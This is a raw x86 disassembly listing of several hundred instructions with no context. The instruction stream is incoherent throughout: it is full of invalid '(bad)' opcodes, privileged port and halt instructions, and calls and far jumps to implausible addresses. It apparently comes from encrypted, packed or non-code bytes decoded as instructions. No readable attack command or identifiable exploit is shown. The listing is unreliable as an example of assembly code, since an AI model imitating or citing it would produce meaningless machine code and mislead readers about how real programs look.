  410bea:	call   0xc74951a
  410bef:	mov    DWORD PTR [ebp+0x10],ecx
  410bf2:	(bad)  
  410bf3:	push   0x8b85ff10
  410bf8:	clc    
  410bf9:	or     al,0x54
  410bfb:	(bad)  
  410bfc:	push   ecx
  410bfd:	retf   
  410bfe:	mov    ebx,0xff4d8dc8
  410c03:	mov    DWORD PTR [ebp+0x8],eax
  410c06:	xor    eax,DWORD PTR [ebp-0x75]
  410c09:	cmp    ebp,DWORD PTR [ebx]
  410c0b:	lsl    ebx,WORD PTR [edi-0x8]
  410c0f:	call   DWORD PTR [ebx-0x741bff75]
  410c15:	(bad)  
  410c16:	or     al,0x5b
  410c18:	dec    ebp
  410c19:	or     BYTE PTR [ebx],dh
  410c1b:	inc    ebp
  410c1c:	xor    esi,DWORD PTR ds:0x708088d
  410c22:	in     eax,0x9b
  410c24:	add    BYTE PTR [edx],dh
  410c26:	inc    ebp
  410c27:	pop    edi
  410c28:	xor    eax,edx
  410c2a:	test   DWORD PTR [eax],0x83108b8b
  410c30:	dec    ebp
  410c31:	adc    al,0x33
  410c33:	inc    ebp
  410c34:	xor    esi,DWORD PTR [ecx]
  410c36:	sub    ebx,DWORD PTR [ebx+edi*1-0x74038a39]
  410c3d:	test   DWORD PTR [eax],ecx
  410c3f:	clc    
  410c40:	inc    ebp
  410c41:	add    ecx,DWORD PTR [ebx+0xc7f445]
  410c47:	hlt    
  410c48:	leave  
  410c49:	test   DWORD PTR [esi],eax
  410c4b:	clc    
  410c4c:	inc    esi
  410c4d:	push   edi
  410c4e:	cmp    BYTE PTR [ebp+0x17],al
  410c51:	ror    DWORD PTR [ebp-0x29],1
  410c54:	or     BYTE PTR [ebx+0x4d65fc54],0xd1
  410c5b:	mov    eax,0x780084d
  410c60:	push   esp
  410c61:	clc    
  410c62:	ret    0xe99b
  410c65:	xor    dl,dl
  410c67:	xor    ecx,DWORD PTR [ebx+0x4d030803]
  410c6d:	js     0x887986c
  410c73:	dec    ebp
  410c74:	push   ebp
  410c75:	mov    edi,DWORD PTR [eax+0xc872fc]
  410c7b:	lock enter 0xceca,0xf2
  410c80:	retf   0x18ce
  410c83:	jne    0x410cd2
  410c85:	mov    ecx,DWORD PTR [ebx-0x31eaf304]
  410c8b:	enter  0xf0d6,0xca
  410c8f:	retf   0xf2c8
  410c92:	into   
  410c93:	out    dx,al
  410c94:	dec    ebp
  410c95:	dec    ebp
  410c96:	jmp    0xff450bce
  410c9b:	xor    eax,DWORD PTR [ebp-0x15]
  410c9e:	xor    esi,DWORD PTR [ebx]
  410ca0:	mov    esi,DWORD PTR [ebx]
  410ca2:	sub    eax,DWORD PTR [ebx]
  410ca4:	add    eax,DWORD PTR [ebx]
  410ca6:	or     bl,dl
  410ca8:	dec    ebp
  410ca9:	mov    DWORD PTR [ebx-0x38b2ef08],ecx
  410caf:	xor    eax,DWORD PTR [ebp-0xf00073]
  410cb5:	jb     0x410cfc
  410cb7:	add    BYTE PTR [ebx],dh
  410cb9:	dec    ebp
  410cba:	pop    esi
  410cbb:	mov    ebp,ebx
  410cbd:	cld    
  410cbe:	mov    esi,eax
  410cc0:	call   0x520f618d
  410cc5:	stc    
  410cc6:	add    eax,0x4572aa
  410ccb:	pop    edi
  410ccc:	leave  
  410ccd:	add    ecx,DWORD PTR [eax*2-0x3c13a1ab]
  410cd4:	in     al,dx
  410cd5:	mov    eax,edi
  410cd7:	xor    eax,0xf8008520
  410cdd:	mov    DWORD PTR [ebp-0x14],0xf89c8532
  410ce4:	mov    eax,DWORD PTR [ebp-0x77]
  410ce7:	xor    bh,al
  410ce9:	pushf  
  410cea:	inc    ebp
  410ceb:	(bad)  
  410cec:	cmp    eax,ebp
  410cee:	pushf  
  410cef:	xchg   BYTE PTR [esi-0x8],dl
  410cf2:	mov    edi,0x8518e4ec
  410cf8:	jmp    0xf056:0x8b457df8
  410cff:	push   esp
  410d00:	push   esp
  410d01:	push   ecx
  410d02:	push   ecx
  410d03:	push   edi
  410d04:	xor    eax,esi
  410d06:	mov    edx,0x32729b
  410d0b:	add    ecx,eax
  410d0d:	mov    edx,edi
  410d0f:	clc    
  410d10:	retf   0xaf45
  410d13:	cmp    ebx,ebp
  410d15:	pushf  
  410d16:	mov    eax,edi
  410d18:	clc    
  410d19:	cld    
  410d1a:	jne    0x410d34
  410d1c:	xor    ebp,edx
  410d1e:	xor    eax,DWORD PTR [ebp+0x3]
  410d21:	or     BYTE PTR [ebx],al
  410d23:	add    BYTE PTR [ebp-0x7747475],al
  410d29:	hlt    
  410d2a:	dec    ebp
  410d2b:	dec    ebp
  410d2c:	je     0x410d61
  410d2e:	xor    esi,DWORD PTR [ebx]
  410d30:	xor    eax,DWORD PTR [ebx]
  410d32:	add    eax,DWORD PTR [ebx]
  410d34:	add    ecx,DWORD PTR [edi]
  410d36:	rol    ecx,cl
  410d38:	mov    esi,DWORD PTR [ecx]
  410d3a:	in     al,dx
  410d3b:	inc    ebp
  410d3c:	enter  0xca2b,0x33
  410d40:	icebp  
  410d41:	mov    DWORD PTR [edx],ecx
  410d43:	clc    
  410d44:	lock pop ebp
  410d46:	enter  0xf2e8,0xfe
  410d4a:	retf   0xeeff
  410d4d:	inc    ebp
  410d4e:	jne    0x410cdb
  410d50:	mov    edi,eax
  410d52:	cld    
  410d53:	dec    ebp
  410d54:	enter  0xbc89,0x8d
  410d58:	fwait
  410d59:	sti    
  410d5a:	xor    bh,bh
  410d5c:	mov    eax,DWORD PTR [ebp-0xc]
  410d5f:	mov    esi,DWORD PTR [ebp-0x4]
  410d62:	xor    eax,esi
  410d64:	xor    eax,DWORD PTR [ebx+ebp*1+0x76323b9b]
  410d6b:	mov    DWORD PTR [ebx-0x76ba0704],ecx
  410d71:	mov    ecx,DWORD PTR [ebx-0x3631070c]
  410d77:	(bad)  
  410d78:	push   ebp
  410d79:	shr    esp,0x4d
  410d7c:	in     al,dx
  410d7d:	cmp    eax,DWORD PTR [esi+esi*2]
  410d80:	add    BYTE PTR [ebx-0x39ce1bbb],cl
  410d86:	pushf  
  410d87:	mov    edi,0x85c7f445
  410d8d:	call   0xf886948a
  410d92:	xor    ebx,ebx
  410d94:	pushf  
  410d95:	popa   
  410d96:	push   ebx
  410d97:	dec    ebp
  410d98:	inc    ebp
  410d99:	mov    esi,DWORD PTR [eax]
  410d9b:	clc    
  410d9c:	pushf  
  410d9d:	into   
  410d9e:	mov    ecx,edi
  410da0:	in     al,dx
  410da1:	call   0x8b495364
  410da6:	pop    es
  410da7:	or     BYTE PTR [ebx],dh
  410da9:	or     BYTE PTR [edi+0x8a724d],bh
  410daf:	or     eax,edi
  410db1:	push   ebp
  410db2:	inc    ebp
  410db3:	cmpxchg8b (bad)
  410db4:	(bad)  
  410db5:	leave  
  410db6:	loopne 0x410d82
  410db8:	test   DWORD PTR [ebp-0x8],ecx
  410dbb:	mov    eax,DWORD PTR [ebp-0x18]
  410dbe:	rcl    DWORD PTR [ebp-0x29],1
  410dc1:	xor    eax,edi
  410dc3:	add    esi,eax
  410dc5:	and    eax,DWORD PTR [eax]
  410dc7:	mov    eax,DWORD PTR [eax]
  410dc9:	(bad)  
  410dca:	leave  
  410dcb:	sti    
  410dcc:	inc    ebp
  410dcd:	dec    DWORD PTR [ebx-0x39cc13ab]
  410dd3:	mov    esi,ecx
  410dd5:	clc    
  410dd6:	(bad)  
  410dd7:	dec    ebp
  410dd8:	iret   
  410dd9:	xor    ebp,DWORD PTR [edi-0x74f71473]
  410ddf:	jb     0x410ddd
  410de1:	add    bh,al
  410de3:	inc    ebp
  410de4:	(bad)  
  410de5:	mov    eax,DWORD PTR [ebp-0xc]
  410de8:	(bad)  
  410de9:	xabort 0x65
  410dec:	loopne 0x410dbb
  410dee:	jmp    FWORD PTR [ebx]
  410df0:	mov    DWORD PTR [ebx],eax
  410df2:	clc    
  410df3:	lock inc ebp
  410df5:	dec    ebp
  410df6:	mov    ecx,DWORD PTR [ebx+0x4d84ecfc]
  410dfc:	loopne 0x410e31
  410dfe:	inc    DWORD PTR [ebx]
  410e00:	mov    edi,DWORD PTR [ebx]
  410e02:	hlt    
  410e03:	jne    0x410e52
  410e05:	mov    esi,DWORD PTR [ebx]
  410e07:	in     al,0x8d
  410e09:	dec    ebp
  410e0a:	or     BYTE PTR [ebx],dh
  410e0c:	jb     0x410e11
  410e0e:	add    BYTE PTR [edi+0x45],bl
  410e11:	xor    ecx,DWORD PTR [ebx+0x4dc2e85b]
  410e17:	add    BYTE PTR [ebx],dh
  410e19:	mov    esi,DWORD PTR [ebx]
  410e1b:	sub    DWORD PTR [ebx],0x6c
  410e1e:	mov    eax,DWORD PTR [ebp-0x4]
  410e21:	xor    eax,ecx
  410e23:	pushf  
  410e24:	mov    ecx,0x338545ba
  410e29:	clc    
  410e2a:	add    edx,DWORD PTR [ebp-0x77]
  410e2d:	mov    edi,eax
  410e2f:	adc    al,0x45
  410e31:	inc    ebp
  410e32:	xor    BYTE PTR [ebx-0x7f74eb64],cl
  410e38:	jmp    0x410e3b
  410e3a:	mov    eax,DWORD PTR [eax]
  410e3c:	loopne 0x410e8b
  410e3e:	inc    ebp
  410e3f:	mov    esi,DWORD PTR [ebx]
  410e41:	mov    eax,DWORD PTR [ebx]
  410e43:	nop
  410e44:	rol    DWORD PTR [eax],cl
  410e46:	mov    DWORD PTR [ebx+0x3c4503fc],ecx
  410e4c:	mov    cl,BYTE PTR [ecx+0x450bf888]
  410e52:	dec    ebp
  410e53:	push   esi
  410e54:	mov    edi,DWORD PTR [edi+0x7b608f8]
  410e5a:	xor    eax,edi
  410e5c:	mov    DWORD PTR [ebx+0x34d3208],ebx
  410e62:	mov    ecx,DWORD PTR [ecx+0x45ceec08]
  410e68:	iret   
  410e69:	xor    ecx,edx
  410e6b:	add    ecx,DWORD PTR [ecx+ecx*4+0x45fff4e0]
  410e72:	mov    ecx,DWORD PTR [ebx-0x1735af04]
  410e78:	dec    ebp
  410e79:	mov    DWORD PTR [ebx-0x31ba0b2c],ecx
  410e7f:	mov    eax,DWORD PTR [eax+edi*1+0x48324d9b]
  410e86:	mov    DWORD PTR [ecx+0x8],eax
  410e89:	mov    eax,DWORD PTR [ebp-0x8]
  410e8c:	xor    ebx,DWORD PTR [eax]
  410e8e:	mov    ecx,0xff8b8d40
  410e93:	clc    
  410e94:	enter  0x4d49,0x48
  410e98:	mov    eax,edx
  410e9a:	lock enter 0x4545,0x8b
  410e9f:	mov    esi,eax
  410ea1:	cmp    dh,al
  410ea3:	rol    edi,0x3
  410ea6:	enter  0x9140,0x89
  410eaa:	inc    ebp
  410eab:	adc    al,0x8b
  410ead:	inc    ebp
  410eae:	clc    
  410eaf:	xor    eax,esi
  410eb1:	add    eax,edi
  410eb3:	mov    DWORD PTR [esi-0x24],ebx
  410eb6:	rol    DWORD PTR [ebp-0x37],0x33
  410eba:	add    al,0x3
  410ebc:	push   ebp
  410ebd:	mov    esp,ebp
  410ebf:	fsubr  st,st(4)
  410ec1:	inc    ebp
  410ec2:	(bad)  
  410ec3:	mov    edi,esp
  410ec5:	adc    BYTE PTR [ebp+0x32c3f8c7],al
  410ecb:	add    DWORD PTR [ebp+edx*2-0x27173877],ebx
  410ed2:	inc    ebp
  410ed3:	test   DWORD PTR [ecx+0x454514f8],ecx
  410ed9:	cmp    al,0x8b
  410edb:	pushf  
  410edc:	nop
  410edd:	mov    DWORD PTR [eax],0x14858bd8
  410ee3:	clc    
  410ee4:	add    BYTE PTR [ebp-0x74feff77],al
  410eea:	add    ah,bh
  410eec:	or     edi,eax
  410eee:	dec    eax
  410eef:	ret    
  410ef0:	push   ebx
  410ef1:	inc    ebp
  410ef2:	dec    ebp
  410ef3:	mov    ecx,DWORD PTR [ebx+0x5745fc14]
  410ef9:	mov    DWORD PTR [esp+ebp*8+0x51],edx
  410efd:	jne    0x410f32
  410eff:	mov    edi,DWORD PTR [ebx+0x4d720c]
  410f05:	call   0xff8700cd
  410f0a:	mov    eax,DWORD PTR [ebp-0x4]
  410f0d:	mov    edi,0x4585c3d8
  410f13:	clc    
  410f14:	mov    eax,DWORD PTR [ebp-0x8]
  410f17:	xor    eax,DWORD PTR [eax+0x3]
  410f1a:	adc    DWORD PTR [eax+0xc],0x45
  410f1e:	inc    ebp
  410f1f:	push   eax
  410f20:	mov    ebx,ebp
  410f22:	clc    
  410f23:	inc    DWORD PTR [eax-0x75]
  410f26:	mov    esi,eax
  410f28:	clc    
  410f29:	rol    BYTE PTR [ebp+0x4545544e],0x33
  410f30:	je     0x410f35
  410f32:	mov    edx,DWORD PTR [eax+0x38]
  410f35:	jne    0x410f84
  410f37:	lea    ecx,[ebx-0x817ab44]
  410f3d:	mul    BYTE PTR [ebx]
  410f3f:	dec    DWORD PTR [ebx+0x4089f845]
  410f45:	fadd   DWORD PTR [ebx]
  410f47:	inc    ebp
  410f48:	jmp    0x410ed5
  410f4a:	mov    ecx,DWORD PTR [esp+edx*2]
  410f4d:	rol    DWORD PTR [ebp+0x45],0x8b
  410f51:	mov    edi,esp
  410f53:	lock (bad) 
  410f55:	dec    ebp
  410f56:	ret    
  410f57:	mov    eax,DWORD PTR [ebp+0x10]
  410f5a:	mov    eax,DWORD PTR [ecx-0x4]
  410f5d:	mov    eax,edi
  410f5f:	fadd   st,st(3)
  410f61:	enter  0x1645,0x8b
  410f65:	inc    ebp
  410f66:	cld    
  410f67:	mov    ecx,DWORD PTR [ebp+0xc]
  410f6a:	xor    ecx,DWORD PTR [ebp+0x3]
  410f6d:	add    ecx,DWORD PTR [ecx-0x27b276f8]
  410f73:	sub    eax,DWORD PTR [ebp-0x17]
  410f76:	xor    eax,DWORD PTR [edx]
  410f78:	pushf  
  410f79:	add    bh,al
  410f7b:	or     al,0xd8
  410f7d:	jne    0x410f04
  410f7f:	(bad)  
  410f80:	clc    
  410f81:	mov    al,0x45
  410f83:	call   0xffde05c5
  410f88:	jmp    0xdd12be
  410f8d:	mov    DWORD PTR [ebp-0x30],eax
  410f90:	xor    eax,DWORD PTR [ebp+0x3]
  410f93:	xor    cl,BYTE PTR [ecx+0x45c7f49c]
  410f99:	enter  0x8503,0xc
  410f9d:	clc    
  410f9e:	inc    ebp
  410f9f:	inc    ebp
  410fa0:	(bad)  
  410fa1:	cmp    al,0xec
  410fa3:	pushf  
  410fa4:	jne    0x410f33
  410fa6:	mov    edx,eax
  410fa8:	clc    
  410fa9:	dec    ebp
  410faa:	out    dx,eax
  410fab:	(bad)  
  410fac:	dec    esp
  410fae:	mov    DWORD PTR [ebp-0x10],ecx
  410fb1:	lea    eax,[ebp-0x38]
  410fb4:	cmp    DWORD PTR [ebp-0x64],ecx
  410fb7:	lea    ecx,[ebx-0x38b2273c]
  410fbd:	mov    eax,ebx
  410fbf:	cld    
  410fc0:	(bad)  
  410fc1:	iret   
  410fc2:	mov    esp,0xf74de8cb
  410fc7:	jmp    0x8611cb
  410fcc:	test   DWORD PTR [ebx],esi
  410fce:	je     0x410f6c
  410fd0:	mov    ecx,DWORD PTR [edi]
  410fd2:	fdivr  st,st(6)
  410fd4:	mov    DWORD PTR [eax],0xe8ff8bc3
  410fda:	lock iret 
  410fdc:	inc    ebp
  410fdd:	lock push eax
  410fdf:	retf   
  410fe0:	imul   ecx,DWORD PTR [ebp-0x1],0xecd88b8b
  410fe7:	test   DWORD PTR [ebp-0x7c],0x32d89b8b
  410fee:	dec    ebp
  410fef:	mov    DWORD PTR [ebx],ebp
  410ff1:	fmul   DWORD PTR [ecx+0x458bd845]
  410ff7:	fmul   DWORD PTR [ebx+0x40c3f0c7]
  410ffd:	enter  0x1303,0xc
  411001:	inc    ebp
  411002:	dec    ebp
  411003:	xor    edi,DWORD PTR [ebx]
  411005:	add    esi,DWORD PTR [edx+0x50]
  411008:	mov    ecx,DWORD PTR [eax+esi*8]
  41100b:	inc    ebp
  41100c:	inc    eax
  41100d:	push   eax
  41100e:	mov    ebp,esp
  411010:	lock inc DWORD PTR [ecx-0x75]
  411014:	mov    esp,esp
  411016:	fadd   DWORD PTR [eax]
  411018:	rol    edi,0xee
  41101b:	test   BYTE PTR [eax],al
  41101d:	dec    ebx
  41101e:	push   0x32
  411020:	dec    DWORD PTR [ebx-0x30ba0314]
  411026:	push   eax
  411027:	mov    dh,0x21
  411029:	add    edi,edi
  41102b:	cmp    edi,DWORD PTR [eax-0x7877af1]
  411031:	add    BYTE PTR [ebp-0x75],al
  411034:	(bad)  
  411035:	loopne 0x411003
  411037:	add    BYTE PTR [ebp+0x4584f8c7],al
  41103d:	dec    ebx
  41103e:	xor    esi,DWORD PTR [edx]
  411040:	pushf  
  411041:	mov    eax,edi
  411043:	cld    
  411044:	(bad)  
  411045:	iret   
  411046:	test   DWORD PTR [esi+0x3b4d03f8],esi
  41104c:	mov    DWORD PTR [edi],ecx
  41104e:	in     al,0x58
  411050:	dec    ebp
  411051:	add    BYTE PTR [ecx+0x4df0e08b],cl
  411057:	add    BYTE PTR [ecx+0x4d84f0c7],cl
  41105d:	dec    ebx
  41105e:	mov    DWORD PTR [edx],esi
  411060:	fmul   QWORD PTR [ebx-0x30cc03b3]
  411066:	add    esi,DWORD PTR [esi+0x3bd80389]
  41106c:	test   DWORD PTR [edi],0x3d3800
  411072:	test   DWORD PTR [ebx+0x84dcf8],ecx
  411078:	add    edi,eax
  41107a:	add    BYTE PTR [ebp+ecx*2-0x74cdccb5],al
  411081:	mov    eax,DWORD PTR [ebx]
  411083:	cld    
  411084:	mov    edi,ecx
  411086:	hlt    
  411087:	mov    dh,0x45
  411089:	add    esi,DWORD PTR [ebx]
  41108b:	cmp    ecx,DWORD PTR [ebp+0x7218300f]
  411091:	add    BYTE PTR [eax],al
  411093:	mov    eax,DWORD PTR [ebp-0x20]
  411096:	mov    eax,DWORD PTR [eax]
  411098:	call   0x33c55e64
  41109d:	dec    ebx
  41109e:	add    esi,DWORD PTR [edx]
  4110a0:	cmp    ecx,DWORD PTR [ebx+0x98be475]
  4110a6:	cld    
  4110a7:	iret   
  4110a8:	(bad)  
  4110a9:	mov    ebx,es
  4110ab:	dec    ebx
  4110ac:	push   0x32
  4110ae:	lea    esi,[edx]
  4110b0:	mov    al,0x8b
  4110b2:	call   0xff4b0ba7
  4110b7:	iret   
  4110b8:	inc    ebp
  4110b9:	mov    WORD PTR [ebx-0x75cdccb5],cs
  4110bf:	or     al,BYTE PTR ds:0xe4728b
  4110c5:	or     DWORD PTR [ebp-0x31],ecx
  4110c8:	xor    ecx,DWORD PTR [edi+ecx*1-0x34cd3fb1]
  4110cf:	cmp    al,cl
  4110d1:	je     0x4112ab
  4110d7:	mov    eax,DWORD PTR [ebp-0x10]
  4110da:	mov    eax,DWORD PTR [eax]
  4110dc:	xor    eax,edi
  4110de:	mov    al,BYTE PTR [ebp+eax*1+0x32724b]
  4110e5:	mov    ecx,DWORD PTR [ebp-0x20]
  4110e8:	xor    ecx,DWORD PTR [ecx]
  4110ea:	bswap  edi
  4110ec:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb5],0x32
  4110f4:	add    DWORD PTR [ebx+0x945dc00],ecx
  4110fa:	mov    ecx,edi
  4110fc:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411103:	or     al,BYTE PTR [eax]
  411105:	mov    ecx,DWORD PTR [ebp-0x20]
  411108:	xor    ecx,DWORD PTR [ecx]
  41110a:	bswap  edi
  41110c:	ror    BYTE PTR [ebx+ecx*8-0x7bcd3eb1],0x3a
  411114:	add    DWORD PTR [edi],ecx
  411116:	add    BYTE PTR [eax-0x7474ffbb],dl
  41111c:	xor    ebx,esp
  41111e:	mov    al,BYTE PTR [eax]
  411120:	add    eax,0x8472c7
  411125:	dec    ebx
  411126:	dec    ebp
  411127:	xor    dh,BYTE PTR [ebx]
  411129:	mov    ecx,DWORD PTR [edi]
  41112b:	lock ror BYTE PTR [ecx],0xcb
  41112f:	iret   
  411130:	ror    DWORD PTR [esp+eax*4+0x32014b],0x32
  411138:	inc    ebp
  411139:	mov    ecx,DWORD PTR [ebx-0x75f6cc1c]
  41113f:	iret   
  411140:	add    eax,0x4b728c
  411145:	xor    cl,BYTE PTR [ebp+0xa]
  411148:	mov    ecx,DWORD PTR [ebx+0x98af033]
  41114e:	or     eax,0x8c72cf
  411153:	dec    edi
  411154:	shl    DWORD PTR [edx],0x4d
  411157:	cmp    cl,BYTE PTR [ebx-0x7574cc8b]
  41115d:	fmul   QWORD PTR ds:0xc77200
  411163:	test   cl,al
  411165:	dec    ebx
  411166:	dec    ebp
  411167:	xor    cl,BYTE PTR [ebx-0x751bcc75]
  41116d:	or     DWORD PTR ds:0x8c72cf,ecx
  411173:	dec    ebx
  411174:	enter  0x8532,0x32
  411178:	add    BYTE PTR [ebx+0x945e000],cl
  41117e:	mov    ecx,edi
  411180:	xor    ecx,DWORD PTR [edx+ecx*4+0x7232054b]
  411187:	or     al,BYTE PTR [eax]
  411189:	mov    ecx,DWORD PTR [ebp-0x24]
  41118c:	mov    ecx,DWORD PTR [ecx]
  41118e:	xor    ecx,edi
  411190:	mov    cl,BYTE PTR [ebp+ecx*1+0x32724f]
  411197:	cmp    al,cl
  411199:	jne    0x4111e8
  41119b:	lea    ecx,[ebx-0x7517cc50]
  4111a1:	sti    
  4111a2:	or     eax,0x4d72ff
  4111a7:	cmp    eax,ecx
  4111a9:	je     0x4111f8
  4111ab:	mov    ecx,DWORD PTR [ebx-0x7538cc04]
  4111b1:	ret    
  4111b2:	or     eax,0x8b7245
  4111b7:	call   0x84c6d984
  4111bc:	add    BYTE PTR [ebx+0x33453200],bl
  4111c2:	mov    ecx,DWORD PTR [ebx+0x558afc33]
  4111c8:	add    eax,0x37233
  4111cd:	cmp    ecx,DWORD PTR [ebp+0xf]
  4111d0:	mov    esi,edi
  4111d2:	xor    edi,edi
  4111d4:	mov    cl,BYTE PTR [ebx+0x4d72fc0d]
  4111da:	add    BYTE PTR [ebx],dh
  4111dc:	rol    DWORD PTR [ebx],0x4d
  4111df:	cmp    ecx,DWORD PTR [ebx-0x7574cc8b]
  4111e5:	call   0x33b35ef7
  4111ea:	add    BYTE PTR [ebp+0x724d08c1],cl
  4111f0:	mov    eax,DWORD PTR [eax]
  4111f2:	xor    esi,DWORD PTR [edi-0x76]
  4111f5:	sbb    BYTE PTR ds:0x8d7275,cl
  4111fb:	cwde   
  4111fc:	enter  0x50e8,0xf3
  411200:	inc    ebp
  411201:	dec    DWORD PTR [ebx-0x7574ccbb]
  411207:	fadd   DWORD PTR ds:0xc372c7
  41120d:	ror    DWORD PTR [ebp+0x13],0x8b
  411211:	inc    ebp
  411212:	xor    esi,DWORD PTR [ebx]
  411214:	mov    al,BYTE PTR [ebx]
  411216:	or     eax,0x187250
  41121b:	inc    ebp
  41121c:	rcl    DWORD PTR [eax+0x4d],0xdc
  411220:	mov    edi,edi
  411222:	xor    ecx,DWORD PTR [ebx-0x3ff21376]
  411228:	jb     0x4111b3
  41122a:	add    ah,bl
  41122c:	shl    DWORD PTR [ebp+0x4d],0xff
  411230:	mov    ebx,esp
  411232:	xor    eax,DWORD PTR [ebp-0x76]
  411235:	add    ecx,DWORD PTR ds:0xe87208
  41123b:	repz enter 0x10ff,0x45
  411240:	inc    ebp
  411241:	mov    edx,DWORD PTR [eax-0x28]
  411244:	xor    bh,al
  411246:	inc    ebx
  411248:	mov    eax,ecx
  41124a:	mov    eax,0xa00c111
  41124f:	jne    0x411296
  411251:	mov    esi,DWORD PTR [ebx]
  411253:	test   al,0x3
  411255:	inc    ebp
  411256:	mov    DWORD PTR [eax-0xc],edx
  411259:	mov    ds:0x8b33ff45,al
  41125e:	lea    edx,[eax]
  411260:	xor    BYTE PTR [ebp+0x72],cl
  411263:	add    DWORD PTR [eax],eax
  411265:	mov    eax,edi
  411267:	lods   al,BYTE PTR ds:[esi]
  411268:	dec    ebp
  411269:	inc    ebp
  41126a:	mov    ecx,DWORD PTR [ecx+0x45cf14f4]
  411270:	retf   
  411271:	mov    edx,ecx
  411273:	adc    al,0x84
  411275:	(bad)  
  411276:	std    
  411277:	ret    
  411278:	jmp    FWORD PTR [edi-0x37474bb]
  41127e:	hlt    
  41127f:	push   ebp
  411280:	(bad)  
  411281:	xor    eax,ebx
  411283:	(bad)  
  411284:	enter  0x1111,0x72
  411288:	inc    ebp
  411289:	add    BYTE PTR [ebx-0x387deb3f],cl
  41128f:	cld    
  411290:	test   bh,bh
  411292:	fwait
  411293:	inc    ebp
  411294:	xor    bl,BYTE PTR [edi-0x15]
  411297:	pop    ebx
  411298:	push   0xffffffc2
  41129a:	inc    DWORD PTR [eax]
  41129c:	in     al,dx
  41129d:	mov    eax,DWORD PTR [ebp+0x51]
  4112a0:	push   eax
  4112a1:	inc    ebp
  4112a2:	cmps   DWORD PTR ds:[esi],DWORD PTR es:[edi]
  4112a3:	mov    edi,edi
  4112a5:	or     BYTE PTR [ebx+0x4d80fc16],cl
  4112ab:	add    DWORD PTR [ebx],esi
  4112ad:	add    BYTE PTR [ebx],al
  4112af:	add    BYTE PTR [ebx],bh
  4112b1:	icebp  
  4112b2:	je     0x4112bc
  4112b4:	mov    eax,DWORD PTR [edi]
  4112b6:	cld    
  4112b7:	rol    edi,0x72
  4112ba:	ret    
  4112bb:	add    BYTE PTR [edx-0x2f],ch
  4112be:	lea    edx,[eax]
  4112c0:	cwde   
  4112c1:	jne    0x4112ab
  4112c3:	(bad)  
  4112c4:	clc    
  4112c5:	or     al,0xff
  4112c7:	inc    DWORD PTR [ebp-0x18]
  4112ca:	cmp    ebx,0x18
  4112cd:	inc    DWORD PTR [ebp+0x6]
  4112d0:	call   FWORD PTR [ebp-0x54]
  4112d3:	or     al,0x75
  4112d5:	push   ebp
  4112d6:	mov    ebp,esp
  4112d8:	test   al,0x53
  4112da:	inc    ebp
  4112db:	mov    edx,DWORD PTR [eax-0x75]
  4112de:	imul   ecx,DWORD PTR [eax],0xffffffff
  4112e1:	dec    ebp
  4112e2:	mov    edx,DWORD PTR [edi-0x4]
  4112e5:	push   esp
  4112e6:	dec    ebp
  4112e7:	push   ecx
  4112e8:	xor    esi,DWORD PTR [ebx]
  4112ea:	add    edi,DWORD PTR [edi+0x74723b]
  4112f0:	push   0xffffffc7
  4112f2:	inc    DWORD PTR [ecx]
  4112f4:	lods   al,BYTE PTR ds:[esi]
  4112f5:	inc    ebp
  4112f6:	inc    ebp
  4112f7:	mov    eax,DWORD PTR [ebx]
  4112f9:	xchg   esp,eax
  4112fa:	or     BYTE PTR [eax],al
  4112fc:	call   0xffcd0b8c
  411301:	adc    al,0x45
  411303:	or     BYTE PTR [ebx+0x800ac01],0x0
  41130a:	inc    ebp
  41130b:	inc    ecx
  41130c:	add    ecx,DWORD PTR [ebx-0x76baebec]
  411312:	mov    eax,DWORD PTR [ecx]
  411314:	call   0x338a6019
  411319:	push   0x3
  41131b:	push   0xc1300f
  411320:	dec    ebp
  411321:	jo     0x4112ae
  411323:	push   0xffffffd4
  411325:	dec    edi
  411327:	mov    DWORD PTR [ebx+ecx*4-0x3ccdf765],ecx
  41132e:	cmp    eax,edi
  411330:	cmovne edx,DWORD PTR [edi-0x75]
  411334:	call   DWORD PTR [eax]
  411336:	mov    eax,DWORD PTR [ebp+0x8]
  411339:	call   FWORD PTR [esi+0x14]
  41133c:	leave  
  41133d:	inc    ebp
  41133e:	adc    BYTE PTR [eax+0x55],dl
  411341:	jne    0x41132f
  411343:	call   0xff5212d3
  411348:	dec    ebp
  411349:	inc    ebp
  41134a:	mov    ecx,DWORD PTR [ebx+0x390338b]
  411350:	add    BYTE PTR [ebx],bh
  411352:	mov    esi,DWORD PTR [ecx+eax*4-0x75]
  411356:	push   esp
  411357:	or     al,0x51
  411359:	dec    ebp
  41135a:	xor    DWORD PTR [ebx],0xf32039b
  411360:	cmp    eax,DWORD PTR [ebp+0x74]
  411363:	mov    edi,edi
  411365:	pop    edi
  411366:	adc    BYTE PTR [ebx+0x75],bl
  411369:	ret    0x50
  41136c:	mov    ecx,DWORD PTR ss:[edx-0x7d]
  411370:	(bad)  
  411371:	clc    
  411372:	mov    esp,ebp
  411374:	pop    ecx
  411375:	mov    ecx,0xf80085c2
  41137a:	mov    ecx,DWORD PTR [ecx+edx*2]
  41137d:	push   esi
  41137e:	push   esi
  41137f:	(bad)  
  411380:	lock add DWORD PTR [ebp+0x44],eax
  411384:	mov    edx,DWORD PTR [eax]
  411386:	adc    BYTE PTR [ebx+edi*4+0x8],bh
  41138a:	or     BYTE PTR [edi+eax*1+0x51],dl
  41138e:	ret    
  41138f:	xor    ebx,DWORD PTR [ebx+0x37232be]
  411395:	add    BYTE PTR [ecx+0x147c8bfe],cl
  41139b:	or     al,0x80
  41139d:	jge    0x4113a0
  41139f:	mov    DWORD PTR [eax],eax
  4113a1:	and    al,0x8
  4113a3:	cmp    DWORD PTR [ebp+0x10],eax
  4113a6:	mov    edx,DWORD PTR [esi]
  4113a8:	xchg   esp,eax
  4113a9:	dec    esp
  4113aa:	add    BYTE PTR [eax],dl
  4113ac:	mov    ecx,edx
  4113ae:	add    edx,DWORD PTR [esp+edi*1+0x8]
  4113b2:	dec    ebp
  4113b3:	into   
  4113b4:	mov    ebp,DWORD PTR [edi+0x240089d8]
  4113ba:	mov    edx,DWORD PTR [eax+0x14]
  4113bd:	das    
  4113be:	add    al,0x45
  4113c0:	add    BYTE PTR [ebp+0x0],dh
  4113c3:	mov    edi,edi
  4113c5:	and    al,0x50
  4113c7:	mov    eax,DWORD PTR [eax]
  4113c9:	and    al,0xd1
  4113cb:	xor    eax,DWORD PTR [esi]
  4113cd:	lea    eax,[ebp+0x8]
  4113d0:	xor    esi,DWORD PTR [edx+0x3]
  4113d3:	add    BYTE PTR [ecx+0x4510fc44],cl
